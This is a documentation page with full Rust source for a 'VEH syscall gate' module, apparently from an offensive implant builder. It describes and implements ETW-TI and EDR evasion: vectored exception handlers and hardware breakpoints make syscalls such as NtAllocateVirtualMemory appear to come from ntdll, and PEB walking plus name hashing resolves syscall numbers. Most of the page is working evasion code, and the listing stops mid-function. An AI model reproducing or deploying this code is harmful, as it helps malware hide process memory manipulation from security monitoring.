# crowd -- veh_gate.rs  (VEH Syscall Gate -- ETW-TI evasion via Hardware Breakpoints)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/veh_gate.rs` |
| **Lines** | 946 |
| **Cards** | T002-veh-gate |
| **Role** | VEH syscall gate (consolidated) |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 12 |

## Purpose

# crowd -- veh_gate.rs  (VEH Syscall Gate -- ETW-TI evasion via Hardware Breakpoints)

Consolidated port of `crates/core/src/experimental/evasion/veh/` (5 files, ~1200 lines)
into a single self-contained module for crowd's builder pipeline.

## Technique

1. Register two VEH handlers via `AddVectoredExceptionHandler`:
- `AddHwBp`:     catches ACCESS_VIOLATION, sets DR0/DR1 hardware breakpoints
- `HandlerHwBp`: catches SINGLE_STEP, orchestrates syscall execution

2. When a syscall is needed (`set_hw_bp`):
- Store SSN + extended-args flag in global state
- Trigger ACCESS_VIOLATION via inline asm (null-deref with target addr in RCX)
- `AddHwBp` reads RCX (ntdll stub addr), scans for `0F 05` (SYSCALL opcode),
sets DR0 = entry, DR1 = entry + ret_offset, enables DR7 bits

3. The ntdll stub is called normally. CPU hits DR0 => SINGLE_STEP:
- Handler saves full CONTEXT, redirects RIP to a benign trampoline,
sets TRACE_FLAG to keep single-stepping

4. Single-stepping through ntdll until a `sub rsp, >=0x58` + `call` pattern:
- Handler restores original CONTEXT, sets R10=RCX, EAX=SSN,
RIP = SYSCALL instruction, copies extended stack args if needed

5. DR1 breakpoint fires after SYSCALL;RET:
- Handler saves RAX (NTSTATUS), restores RSP, clears DR0/DR1/DR7

Result: syscall executes with RIP inside ntdll (legitimate call stack).
ETW-TI sees the kernel transition from ntdll's .text section.

## Public API

- `initialize()` -- register VEH handlers, resolve ntdll base/end
- `destroy()`    -- remove VEH handlers
- `set_hw_bp(addr, extended, ssn)` -- trigger a VEH-mediated syscall
- `take_last_rax()` -- retrieve the NTSTATUS from the last VEH syscall
- `get_ssn_by_name(name, hash)` -- resolve SSN + address from ntdll exports

## Usage with the `veh_syscall!` macro

```ignore
veh_gate::initialize()?;

let status = veh_syscall!(
"NtAllocateVirtualMemory",
OrgNtAllocateVirtualMemory,
process_handle, &mut base, 0usize, &mut size, alloc_type, protect
);

veh_gate::destroy();
```

## Constants

- `CALL_FIRST`: `u32` = `1`
- `EXCEPTION_ACCESS_VIOLATION`: `u32` = `0xC0000005`
- `EXCEPTION_SINGLE_STEP`: `u32` = `0x80000004`
- `EXCEPTION_CONTINUE_EXECUTION`: `i32` = `-1`
- `EXCEPTION_CONTINUE_SEARCH`: `i32` = `0`
- `TRACE_FLAG`: `u32` = `0x100`
- `OPCODE_CALL`: `u8` = `0xE8`
- `OPCODE_RET`: `u8` = `0xC3`
- `OPCODE_RET_CC`: `u16` = `0xCCC3`
- `OPCODE_SUB_RSP`: `u32` = `0xEC8348` — 48 83 EC as little-endian u24
- `OPCODE_SZ_ACC_VIO`: `u64` = `2`
- `FIFTH_ARGUMENT`: `u64` = `0x8 * 0x5`
- `SIXTH_ARGUMENT`: `u64` = `0x8 * 0x6`
- `SEVENTH_ARGUMENT`: `u64` = `0x8 * 0x7`
- `EIGHTH_ARGUMENT`: `u64` = `0x8 * 0x8`
- `NINTH_ARGUMENT`: `u64` = `0x8 * 0x9`
- `TENTH_ARGUMENT`: `u64` = `0x8 * 0xA`
- `ELEVENTH_ARGUMENT`: `u64` = `0x8 * 0xB`
- `TWELVETH_ARGUMENT`: `u64` = `0x8 * 0xC`
- `NTDLL_HASH`: `u32` = `0x1edab0ed`
- `IMAGE_DOS_SIGNATURE`: `u16` = `0x5A4D`
- `IMAGE_NT_SIGNATURE`: `u32` = `0x00004550`
- `IMAGE_DIRECTORY_ENTRY_EXCEPTION`: `usize` = `3`

## Types

### struct `ListEntry` (line 111)

### struct `UnicodeString` (line 117)

### struct `SectionPointer` (line 125)

### struct `LoaderDataTableEntry` (line 143)

### struct `PebLoaderData` (line 165)

### struct `PEB` (line 175)

### struct `ImageDosHeader` (line 187)

### struct `ImageFileHeader` (line 210)

### struct `ImageDataDirectory` (line 221)

### struct `ImageOptionalHeader64` (line 227)

### struct `ImageNtHeaders` (line 261)

### struct `ImageExportDirectory` (line 268)

### struct `ImageRuntimeFunctionEntry` (line 283)

### struct `SyscallState` (line 294)

### struct `DllInfo` (line 303)

## Public API

### `djb2_hash` (line 358)
```rust
pub fn djb2_hash(buffer: &[u8]) -> u32
```
DJB2 hash over an ASCII byte buffer, case-insensitive.

### `ldr_module_info` `unsafe` (line 384)
```rust
pub unsafe fn ldr_module_info(module_hash: u32) -> (*const u8, usize)
```
Walk PEB InLoadOrderModuleList, DJB2-hash each module name,
return (base_ptr, size_of_image) for the matched module.

# Arguments
* `module_hash` -- DJB2 hash of the target module name (e.g. 0x1edab0ed for ntdll.dll)

### `get_ssn_by_name` `unsafe` (line 432)
```rust
pub unsafe fn get_ssn_by_name(
```
Resolve the System Service Number (SSN) and address of a syscall from ntdll.

Walks the PEB to find ntdll.dll, then correlates the Exception Directory
(sorted by RVA) with the Export Address Table to determine the SSN index.

# Arguments
* `syscall_name` -- Name of the Nt* function (e.g. "NtAllocateVirtualMemory")
* `hash`         -- Optional DJB2 hash; if Some, match by hash instead of name
* `addr`         -- Output: set to the function's address in ntdll

# Returns
SSN on success (>= 0), -1 if not found.

### `syscall_trampoline` `unsafe` (line 544)
```rust
pub unsafe extern "C" fn syscall_trampoline() {}
```
Benign trampoline -- keeps the call stack clean during single-step traversal.
The VEH handler redirects RIP here after the first DR0 hit, then single-steps
through ntdll's internal calls until reaching the actual SYSCALL instruction.

### `initialize` (line 806)
```rust
pub fn initialize() -> anyhow::Result<()>
```

### `destroy` (line 843)
```rust
pub fn destroy()
```

### `set_hw_bp` `unsafe` (line 866)
```rust
pub unsafe fn set_hw_bp(addr: usize, extended: u8, ssn: u32)
```
Trigger a VEH-mediated syscall via hardware breakpoints.

# Arguments
* `addr`     -- Address of the ntdll Nt* stub to invoke
* `extended` -- Non-zero if the syscall has more than 4 arguments
* `ssn`      -- System Service Number

# Safety
Caller must ensure `addr` points to a valid ntdll syscall stub.
`initialize()` must have been called first.

### `take_last_rax` (line 889)
```rust
pub fn take_last_rax() -> Option<u64>
```
Retrieve and clear the return value (RAX / NTSTATUS) of the last VEH syscall.

Returns `Some(ntstatus)` if a VEH syscall completed since the last call,
`None` otherwise. Each call consumes the stored value.

## Internal Functions

- `find_peb` (unsafe) (line 335)
- `hash_unicode_djb2` (unsafe) — DJB2 hash over a wide-char (UTF-16LE) buffer, case-insensitive. (line 342)
- `cstr_len` (unsafe) — Length of a null-terminated C string. (line 371)
- `AddHwBp` (unsafe) (line 555)
- `HandlerHwBp` (unsafe) (line 613)

## Macros

- `copy_stack_arg!` (macro_rules, line 761)
- `veh_syscall!` (macro_rules, line 918)

## Key Dependencies

- `use core::arch::asm;`
- `use core::ffi::c_ulong;`
- `use winapi::ctypes::c_void;`
- `use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};`
- `use winapi::um::winnt::{CONTEXT, EXCEPTION_POINTERS};`

## Full Source

```rust
//! # crowd -- veh_gate.rs  (VEH Syscall Gate -- ETW-TI evasion via Hardware Breakpoints)
//!
//! Consolidated port of `crates/core/src/experimental/evasion/veh/` (5 files, ~1200 lines)
//! into a single self-contained module for crowd's builder pipeline.
//!
//! ## Technique
//!
//! 1. Register two VEH handlers via `AddVectoredExceptionHandler`:
//!    - `AddHwBp`:     catches ACCESS_VIOLATION, sets DR0/DR1 hardware breakpoints
//!    - `HandlerHwBp`: catches SINGLE_STEP, orchestrates syscall execution
//!
//! 2. When a syscall is needed (`set_hw_bp`):
//!    - Store SSN + extended-args flag in global state
//!    - Trigger ACCESS_VIOLATION via inline asm (null-deref with target addr in RCX)
//!    - `AddHwBp` reads RCX (ntdll stub addr), scans for `0F 05` (SYSCALL opcode),
//!      sets DR0 = entry, DR1 = entry + ret_offset, enables DR7 bits
//!
//! 3. The ntdll stub is called normally. CPU hits DR0 => SINGLE_STEP:
//!    - Handler saves full CONTEXT, redirects RIP to a benign trampoline,
//!      sets TRACE_FLAG to keep single-stepping
//!
//! 4. Single-stepping through ntdll until a `sub rsp, >=0x58` + `call` pattern:
//!    - Handler restores original CONTEXT, sets R10=RCX, EAX=SSN,
//!      RIP = SYSCALL instruction, copies extended stack args if needed
//!
//! 5. DR1 breakpoint fires after SYSCALL;RET:
//!    - Handler saves RAX (NTSTATUS), restores RSP, clears DR0/DR1/DR7
//!
//! Result: syscall executes with RIP inside ntdll (legitimate call stack).
//! ETW-TI sees the kernel transition from ntdll's .text section.
//!
//! ## Public API
//!
//! - `initialize()` -- register VEH handlers, resolve ntdll base/end
//! - `destroy()`    -- remove VEH handlers
//! - `set_hw_bp(addr, extended, ssn)` -- trigger a VEH-mediated syscall
//! - `take_last_rax()` -- retrieve the NTSTATUS from the last VEH syscall
//! - `get_ssn_by_name(name, hash)` -- resolve SSN + address from ntdll exports
//!
//! ## Usage with the `veh_syscall!` macro
//!
//! ```ignore
//! veh_gate::initialize()?;
//!
//! let status = veh_syscall!(
//!     "NtAllocateVirtualMemory",
//!     OrgNtAllocateVirtualMemory,
//!     process_handle, &mut base, 0usize, &mut size, alloc_type, protect
//! );
//!
//! veh_gate::destroy();
//! ```

#![allow(dead_code, non_snake_case, non_camel_case_types)]

use std::ptr;
use std::sync::Mutex;

use core::arch::asm;
use core::ffi::c_ulong;
use winapi::ctypes::c_void;

use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};
use winapi::um::winnt::{CONTEXT, EXCEPTION_POINTERS};

// ══════════════════════════════════════════════════════════════════════════════
// Constants
// ══════════════════════════════════════════════════════════════════════════════

const CALL_FIRST: u32 = 1;

const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC0000005;
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

const TRACE_FLAG: u32 = 0x100;

const OPCODE_CALL: u8 = 0xE8;
const OPCODE_RET: u8 = 0xC3;
const OPCODE_RET_CC: u16 = 0xCCC3;
const OPCODE_SUB_RSP: u32 = 0xEC8348; // 48 83 EC as little-endian u24

/// Size of the access-violation trigger instruction sequence (xor rax,rax; mov edx,[rax])
const OPCODE_SZ_ACC_VIO: u64 = 2;

/// Stack argument offsets for extended syscalls (5th arg onward, 8 bytes each)
const FIFTH_ARGUMENT: u64 = 0x8 * 0x5;
const SIXTH_ARGUMENT: u64 = 0x8 * 0x6;
const SEVENTH_ARGUMENT: u64 = 0x8 * 0x7;
const EIGHTH_ARGUMENT: u64 = 0x8 * 0x8;
const NINTH_ARGUMENT: u64 = 0x8 * 0x9;
const TENTH_ARGUMENT: u64 = 0x8 * 0xA;
const ELEVENTH_ARGUMENT: u64 = 0x8 * 0xB;
const TWELVETH_ARGUMENT: u64 = 0x8 * 0xC;

/// DJB2 hash of "ntdll.dll" (case-insensitive Unicode)
const NTDLL_HASH: u32 = 0x1edab0ed;

// PE constants
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x00004550;
const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;

// ══════════════════════════════════════════════════════════════════════════════
// Internal repr(C) structs -- PEB walking + PE parsing
// ══════════════════════════════════════════════════════════════════════════════

#[repr(C)]
#[derive(Copy, Clone)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct SectionPointer {
    section_pointer: *mut c_void,
    check_sum: c_ulong,
}

#[repr(C)]
union HashLinksOrSectionPointer {
    hash_links: ListEntry,
    section_pointer: SectionPointer,
}

#[repr(C)]
union TimeDateStampOrLoadedImports {
    time_date_stamp: c_ulong,
    loaded_imports: *mut c_void,
}

#[repr(C)]
struct LoaderDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: c_ulong,
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
    flags: c_ulong,
    load_count: i16,
    tls_index: i16,
    hash_links_or_section_pointer: HashLinksOrSectionPointer,
    time_date_stamp_or_loaded_imports: TimeDateStampOrLoadedImports,
    entry_point_activation_context: *mut c_void,
    patch_information: *mut c_void,
    forwarder_links: ListEntry,
    service_tag_links: ListEntry,
    static_links: ListEntry,
}

#[repr(C)]
struct PebLoaderData {
    length: c_ulong,
    initialized: c_ulong,
    ss_handle: *mut c_void,
    in_load_order_module_list: ListEntry,
    in_memory_order_module_list: ListEntry,
    in_initialization_order_module_list: ListEntry,
}

#[repr(C)]
struct PEB {
    inherited_address_space: u8,
    read_image_file_exec_options: u8,
    being_debugged: u8,
    spare: u8,
    mutant: *mut c_void,
    image_base: *mut c_void,
    loader_data: *const PebLoaderData,
    // remaining fields omitted -- we only need loader_data
}

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageExportDirectory {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

#[repr(C)]
struct ImageRuntimeFunctionEntry {
    begin_address: c_ulong,
    end_address: c_ulong,
    unwind_info_or_data: c_ulong,
}

// ══════════════════════════════════════════════════════════════════════════════
// VEH state
// ══════════════════════════════════════════════════════════════════════════════

#[derive(Default, Clone, Copy)]
struct SyscallState {
    opcode_syscall_off: u64,
    opcode_syscall_ret_off: u64,
    syscall_entry_address: u64,
    is_sub_rsp: i32,
    syscall_no: u32,
    extended_args: bool,
}

struct DllInfo {
    base_address: u64,
    end_address: u64,
}

static STATE: Mutex<SyscallState> = Mutex::new(SyscallState {
    opcode_syscall_off: 0,
    opcode_syscall_ret_off: 0,
    syscall_entry_address: 0,
    is_sub_rsp: 0,
    syscall_no: 0,
    extended_args: false,
});

static NTDLL_INFO: Mutex<DllInfo> = Mutex::new(DllInfo {
    base_address: 0,
    end_address: 0,
});

static SAVED_CONTEXT: Mutex<Option<Box<CONTEXT>>> = Mutex::new(None);
static LAST_RAX: Mutex<Option<u64>> = Mutex::new(None);

static mut H1: *mut c_void = ptr::null_mut();
static mut H2: *mut c_void = ptr::null_mut();

// ══════════════════════════════════════════════════════════════════════════════
// PEB + module introspection (no Win32 API imports)
// ══════════════════════════════════════════════════════════════════════════════

/// Read PEB pointer from GS:[0x60] (x86_64 only).
#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn find_peb() -> *mut PEB {
    let peb: *mut PEB;
    asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

/// DJB2 hash over a wide-char (UTF-16LE) buffer, case-insensitive.
unsafe fn hash_unicode_djb2(buffer: *const u16, length_bytes: usize) -> u32 {
    let mut hsh: u32 = 5381;
    let wide_len = length_bytes / core::mem::size_of::<u16>();
    let wide_slice = core::slice::from_raw_parts(buffer, wide_len);

    for &wide_char in wide_slice {
        let ch = wide_char as u8;
        if ch == 0 {
            continue;
        }
        hsh = (hsh << 5).wrapping_add(hsh).wrapping_add(ch.to_ascii_uppercase() as u32);
    }
    hsh
}

/// DJB2 hash over an ASCII byte buffer, case-insensitive.
pub fn djb2_hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    for &b in buffer {
        if b == 0 {
            continue;
        }
        let ch = if b >= b'a' { b - 0x20 } else { b };
        hsh = (hsh << 5).wrapping_add(hsh).wrapping_add(ch as u32);
    }
    hsh
}

/// Length of a null-terminated C string.
unsafe fn cstr_len(p: *const u8) -> usize {
    let mut cur = p;
    while *cur != 0 {
        cur = cur.add(1);
    }
    cur as usize - p as usize
}

/// Walk PEB InLoadOrderModuleList, DJB2-hash each module name,
/// return (base_ptr, size_of_image) for the matched module.
///
/// # Arguments
/// * `module_hash` -- DJB2 hash of the target module name (e.g. 0x1edab0ed for ntdll.dll)
pub unsafe fn ldr_module_info(module_hash: u32) -> (*const u8, usize) {
    let peb = find_peb();
    if peb.is_null() {
        return (ptr::null(), 0);
    }

    let peb_ldr = (*peb).loader_data as *mut PebLoaderData;
    if peb_ldr.is_null() {
        return (ptr::null(), 0);
    }

    let head = core::ptr::addr_of_mut!((*peb_ldr).in_load_order_module_list);
    let mut entry = (*head).flink as *mut LoaderDataTableEntry;

    while !entry.is_null() && (entry as *mut ListEntry) != head {
        let dll_buffer = (*entry).base_dll_name.buffer;
        let dll_length = (*entry).base_dll_name.length as usize;

        if !dll_buffer.is_null() && module_hash == hash_unicode_djb2(dll_buffer, dll_length) {
            let dll_base = (*entry).dll_base as *const ImageDosHeader;
            let nt_headers =
                (dll_base as *const u8).offset((*dll_base).e_lfanew as isize) as *const ImageNtHeaders;
            let size = (*nt_headers).optional_header.size_of_image as usize;
            return ((*entry).dll_base as *const u8, size);
        }

        entry = (*entry).in_load_order_links.flink as *mut LoaderDataTableEntry;
    }

    (ptr::null(), 0)
}

// ══════════════════════════════════════════════════════════════════════════════
// SSN resolution via Exception Directory (MDsec technique)
// ══════════════════════════════════════════════════════════════════════════════

/// Resolve the System Service Number (SSN) and address of a syscall from ntdll.
///
/// Walks the PEB to find ntdll.dll, then correlates the Exception Directory
/// (sorted by RVA) with the Export Address Table to determine the SSN index.
///
/// # Arguments
/// * `syscall_name` -- Name of the Nt* function (e.g. "NtAllocateVirtualMemory")
/// * `hash`         -- Optional DJB2 hash; if Some, match by hash instead of name
/// * `addr`         -- Output: set to the function's address in ntdll
///
/// # Returns
/// SSN on success (>= 0), -1 if not found.
pub unsafe fn get_ssn_by_name(
    syscall_name: &str,
    hash: Option<usize>,
    addr: &mut *mut u8,
) -> i32 {
    let peb = find_peb();
    let ldr = (*peb).loader_data as *mut PebLoaderData;

    let mut next = (*ldr).in_memory_order_module_list.flink;
    let head = &mut (*ldr).in_memory_order_module_list as *mut ListEntry;

    while next != head {
        let ent = (next as *mut u8).offset(-(core::mem::size_of::<ListEntry>() as isize))
            as *mut LoaderDataTableEntry;
        next = (*ent).in_memory_order_links.flink;

        let dll_base = (*ent).dll_base as *const u8;
        let dos_header = dll_base as *const ImageDosHeader;
        let nt_headers = dll_base.offset((*dos_header).e_lfanew as isize) as *const ImageNtHeaders;

        let export_rva = (*nt_headers).optional_header.data_directory[0].virtual_address;
        if export_rva == 0 {
            continue;
        }

        let export_dir = dll_base.offset(export_rva as isize) as *const ImageExportDirectory;
        if (*export_dir).number_of_names == 0 {
            continue;
        }

        // Check if this module is ntdll.dll
        let dll_name_ptr = dll_base.offset((*export_dir).name as isize);
        let dll_name_len = cstr_len(dll_name_ptr);
        let dll_name_bytes = core::slice::from_raw_parts(dll_name_ptr, dll_name_len);
        if djb2_hash(dll_name_bytes) != NTDLL_HASH {
            continue;
        }

        // Get Exception Directory (runtime function table, sorted by begin_address)
        let rtf_rva = (*nt_headers).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
            .virtual_address;
        if rtf_rva == 0 {
            return -1;
        }
        let rtf = dll_base.offset(rtf_rva as isize) as *const ImageRuntimeFunctionEntry;

        // Export Address Table
        let fn_addrs =
            dll_base.offset((*export_dir).address_of_functions as isize) as *const c_ulong;
        let fn_names =
            dll_base.offset((*export_dir).address_of_names as isize) as *const c_ulong;
        let fn_ordinals =
            dll_base.offset((*export_dir).address_of_name_ordinals as isize) as *const u16;
        let num_names = (*export_dir).number_of_names as isize;
        let num_functions = (*export_dir).number_of_functions as usize;

        let mut ssn: i32 = 0;

        // Walk the runtime function table (sorted by address => sorted by SSN)
        let mut rtf_idx = 0isize;
        loop {
            let begin_addr = (*rtf.offset(rtf_idx)).begin_address;
            if begin_addr == 0 {
                break;
            }

            // For each runtime function, search for a matching export
            for j in 0..num_names {
                let ordinal = *fn_ordinals.offset(j);
                if ordinal as usize >= num_functions {
                    continue;
                }
                let fn_rva = *fn_addrs.offset(ordinal as isize);

                if fn_rva == begin_addr {
                    let api_name_ptr = dll_base.offset(*fn_names.offset(j) as isize);
                    let api_name_len = cstr_len(api_name_ptr);
                    let api_name =
                        core::str::from_utf8_unchecked(core::slice::from_raw_parts(api_name_ptr, api_name_len));

                    // Match by hash or by name
                    let matched = match hash {
                        Some(h) => h == djb2_hash(api_name.as_bytes()) as usize,
                        None => api_name == syscall_name,
                    };

                    if matched {
                        *addr = dll_base.offset(fn_rva as isize) as *mut u8;
                        return ssn;
                    }

                    // Zw* functions are syscall stubs; increment SSN counter
                    if api_name.starts_with("Zw") {
                        ssn += 1;
                    }
                }
            }

            rtf_idx += 1;
        }
    }

    -1
}

// ══════════════════════════════════════════════════════════════════════════════
// VEH handlers
// ══════════════════════════════════════════════════════════════════════════════

/// Benign trampoline -- keeps the call stack clean during single-step traversal.
/// The VEH handler redirects RIP here after the first DR0 hit, then single-steps
/// through ntdll's internal calls until reaching the actual SYSCALL instruction.
pub unsafe extern "C" fn syscall_trampoline() {}

/// VEH handler #1 (priority CALL_FIRST): catches the initial ACCESS_VIOLATION.
///
/// When `set_hw_bp` triggers a null-deref, this handler:
///   1. Reads the target ntdll stub address from RCX
///   2. Scans the stub for the `0F 05` (SYSCALL) opcode to compute offsets
///   3. Sets DR0 = entry, DR1 = entry + ret_offset (after SYSCALL;RET)
///   4. Enables the DR7 local-enable bits
///   5. Advances RIP past the faulting instruction
#[no_mangle]
unsafe extern "system" fn AddHwBp(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let ei = &*exception_info;

    if (*ei.ExceptionRecord).ExceptionCode != EXCEPTION_ACCESS_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let entry_address = (*ei.ContextRecord).Rcx;

    // Scan up to 25 bytes for SYSCALL opcode (0F 05)
    let mut off_sys: u64 = 0;
    let mut off_ret: u64 = 0;

    for i in 0u64..25 {
        if ptr::read((entry_address + i) as *const u8) == 0x0F
            && ptr::read((entry_address + i + 1) as *const u8) == 0x05
        {
            off_sys = i;
            off_ret = i + 2; // RET is right after SYSCALL
            break;
        }
    }

    if let Ok(mut state) = STATE.lock() {
        state.syscall_entry_address = entry_address;
        state.opcode_syscall_off = off_sys;
        state.opcode_syscall_ret_off = off_ret;

        // Set hardware breakpoints: DR0 = syscall entry, DR1 = after SYSCALL;RET
        (*ei.ContextRecord).Dr0 = entry_address;
        (*ei.ContextRecord).Dr7 |= 1 << 0; // local enable DR0

        (*ei.ContextRecord).Dr1 = entry_address + off_ret;
        (*ei.ContextRecord).Dr7 |= 1 << 2; // local enable DR1
    }

    // Skip past the faulting instruction (xor rax,rax; mov edx,[rax])
    (*ei.ContextRecord).Rip += OPCODE_SZ_ACC_VIO;

    EXCEPTION_CONTINUE_EXECUTION
}

/// VEH handler #2 (priority CALL_FIRST): catches SINGLE_STEP exceptions.
///
/// Three cases:
///
/// **Case A -- DR0 hit (syscall entry):**
///   Save the full CONTEXT, redirect RIP to `syscall_trampoline`, set TRACE_FLAG
///   to keep single-stepping through ntdll.
///
/// **Case B -- Single-stepping inside ntdll:**
///   Walk through ntdll's internal function prologue looking for `sub rsp, >=0x58`
///   followed by a `call`. When the call returns, restore the saved CONTEXT,
///   set R10=RCX, EAX=SSN, RIP=SYSCALL instruction, copy extended stack args.
///
/// **Case C -- DR1 hit (after SYSCALL;RET):**
///   Save RAX (NTSTATUS), restore RSP from saved context, clear breakpoints.
#[no_mangle]
unsafe extern "system" fn HandlerHwBp(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let ei = &*exception_info;

    if (*ei.ExceptionRecord).ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // Snapshot state under lock
    let (entry_address, ret_address, is_sub_rsp, ssn, extended, sys_off) =
        if let Ok(state) = STATE.lock() {
            (
                state.syscall_entry_address,
                state.syscall_entry_address + state.opcode_syscall_ret_off,
                state.is_sub_rsp,
                state.syscall_no,
                state.extended_args,
                state.opcode_syscall_off,
            )
        } else {
            return EXCEPTION_CONTINUE_SEARCH;
        };

    let (ntdll_base, ntdll_end) = if let Ok(info) = NTDLL_INFO.lock() {
        (info.base_address, info.end_address)
    } else {
        (0, 0)
    };

    // ── Case A: DR0 hit -- syscall entry ──────────────────────────────────
    if (*ei.ExceptionRecord).ExceptionAddress == entry_address as *mut c_void {
        // Clear DR0
        (*ei.ContextRecord).Dr0 = 0;
        (*ei.ContextRecord).Dr7 &= !(1 << 0);

        // Save full CONTEXT for later restoration
        if let Ok(mut saved) = SAVED_CONTEXT.lock() {
            let mut ctx = Box::new(core::mem::zeroed::<CONTEXT>());
            ptr::copy_nonoverlapping(ei.ContextRecord, ctx.as_mut(), 1);
            *saved = Some(ctx);
        }

        // Redirect to benign trampoline, keep single-stepping
        (*ei.ContextRecord).Rip = syscall_trampoline as u64;
        (*ei.ContextRecord).EFlags |= TRACE_FLAG;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ── Case C: DR1 hit -- after SYSCALL;RET ──────────────────────────────
    if (*ei.ExceptionRecord).ExceptionAddress == ret_address as *mut c_void {
        // Clear DR1
        (*ei.ContextRecord).Dr1 = 0;
        (*ei.ContextRecord).Dr7 &= !(1 << 2);

        // Restore original RSP
        if let Ok(saved) = SAVED_CONTEXT.lock() {
            if let Some(ref ctx) = *saved {
                (*ei.ContextRecord).Rsp = ctx.Rsp;
            }
        }

        // Save the syscall return value
        if let Ok(mut last) = LAST_RAX.lock() {
            *last = Some((*ei.ContextRecord).Rax);
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ── Case B: Single-stepping inside ntdll ──────────────────────────────
    if (*ei.ContextRecord).Rip >= ntdll_base && (*ei.ContextRecord).Rip <= ntdll_end {
        let mut new_is_sub_rsp = is_sub_rsp;

        // Phase 0: Scan for `sub rsp, >=0x58` prologue pattern
        if is_sub_rsp == 0 {
            for i in 0u64..80 {
                let rip_plus_i = (*ei.ContextRecord).Rip + i;
                // Check for ret;int3 (function boundary)
                let opcode_ret_cc = ptr::read(rip_plus_i as *const u16);
                if opcode_ret_cc == OPCODE_RET_CC {
                    break;
                }
                // Check for sub rsp, imm8
                let opcode_sub = ptr::read(rip_plus_i as *const u32);
                if (opcode_sub & 0x00FF_FFFF) == OPCODE_SUB_RSP {
                    // imm8 is the high byte of the u32 read
                    if (opcode_sub >> 24) >= 0x58 {
                        new_is_sub_rsp = 1;
                        if let Ok(mut state) = STATE.lock() {
                            state.is_sub_rsp = 1;
                        }
                        (*ei.ContextRecord).EFlags |= TRACE_FLAG;
                        return EXCEPTION_CONTINUE_EXECUTION;
                    } else {
                        break;
                    }
                }
            }
        }

        // Phase 1: After sub rsp, look for call or ret
        if new_is_sub_rsp == 1 {
            let rip_value = ptr::read((*ei.ContextRecord).Rip as *const u16);
            if rip_value == OPCODE_RET_CC || (rip_value as u8) == OPCODE_RET {
                // Hit ret -- reset state
                if let Ok(mut state) = STATE.lock() {
                    state.is_sub_rsp = 0;
                }
            } else if (rip_value as u8) == OPCODE_CALL {
                // Found the internal call -- advance to phase 2
                if let Ok(mut state) = STATE.lock() {
                    state.is_sub_rsp = 2;
                }
                (*ei.ContextRecord).EFlags |= TRACE_FLAG;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // Phase 2: The internal call returned -- now execute the real syscall
        if new_is_sub_rsp == 2 {
            if let Ok(mut state) = STATE.lock() {
                state.is_sub_rsp = 0;
            }

            let temp_rsp = (*ei.ContextRecord).Rsp;

            // Restore original CONTEXT (registers, stack frame)
            if let Ok(saved) = SAVED_CONTEXT.lock() {
                if let Some(ref ctx) = *saved {
                    ptr::copy_nonoverlapping(
                        ctx.as_ref() as *const CONTEXT,
                        ei.ContextRecord as *mut CONTEXT,
                        1,
                    );

